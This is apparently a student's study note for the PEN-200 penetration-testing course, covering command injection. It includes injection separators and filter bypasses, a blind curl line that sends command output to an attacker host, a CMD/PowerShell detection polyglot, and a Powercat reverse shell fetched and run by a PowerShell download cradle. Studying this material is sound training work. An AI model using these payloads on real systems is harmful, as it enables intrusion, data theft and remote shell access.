# Command Injection

> **PEN-200 Chapter 9.** Command injection occurs when attacker-controlled input reaches an operating-system command. When an application exposes a feature that resembles a shell command (Git operations, ping, archive tools, conversion utilities, etc.), capture the request and test the controlling parameter.

## Quick tests

```text
# Test separators / substitutions
; | || && & ` $() \n %0a

ping=127.0.0.1; whoami
ping=127.0.0.1|whoami
ping=127.0.0.1`whoami`

# URL-encoded semicolon
%3B

# Blind / OOB example
ping=127.0.0.1; curl http://<LHOST>/?x=$(id|base64)
```

Common separators:

```text
;     command separator (Bash / PowerShell and many shells)
&&    run next command if previous succeeds
&     useful especially with Windows CMD
|     pipe
```

## PEN-200 testing workflow

Do not only inject random commands. Start from **known-valid input** and work outward.

```text
valid application input
   ↓
reduce to underlying program / command
   ↓
try harmless subcommand / version
   ↓
append encoded separator + second command
   ↓
identify OS / execution shell
   ↓
reverse shell
```

Example logic from the chapter:

```text
expected input: git clone <URL>
try:           git
try:           git version
then:          git%3Bipconfig
```

`git version` can both confirm command execution and reveal Windows vs Linux (Git for Windows includes a Windows-specific version string).

## Encoding / filter bypass

If literal separators or spaces are blocked, URL encode them:

```text
;       → %3B
space   → %20
```

Try different separators depending on the underlying shell:

```text
;   &&   &
```

The key is to backtrack from input the application accepts and discover exactly what the filter permits.

## Determine CMD vs PowerShell

On Windows, knowing the interpreter helps choose a reliable payload. PEN-200 uses this polyglot-style test:

```powershell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

URL-encode it when placing it in a web parameter. The output tells you whether injected commands are being executed by **CMD** or **PowerShell**.

## Windows PowerShell / Powercat reverse shell

PEN-200 demonstrates Powercat as a convenient PowerShell reverse-shell path.

Copy Powercat and serve it:

```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
```

Listener:

```bash
nc -nvlp 4444
```

PowerShell download cradle + Powercat:

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://<LHOST>/powercat.ps1");powercat -c <LHOST> -p 4444 -e powershell
```

URL-encode the injected value before sending it through the vulnerable parameter.

## General reminders

- Prefer harmless commands first: `id`, `whoami`, `uname -a`, `ipconfig`, `git version`.
- Confirm the OS before selecting the final payload.
- Confirm whether execution is direct, CMD, PowerShell, `/bin/sh`, or Bash when payload syntax matters.
- Use Burp Repeater to vary one part of the request at a time.

Related: [[Directory Traversal]] · [[LFI-Local File Inclusion|LFI]] · [[File Upload Bypass]]
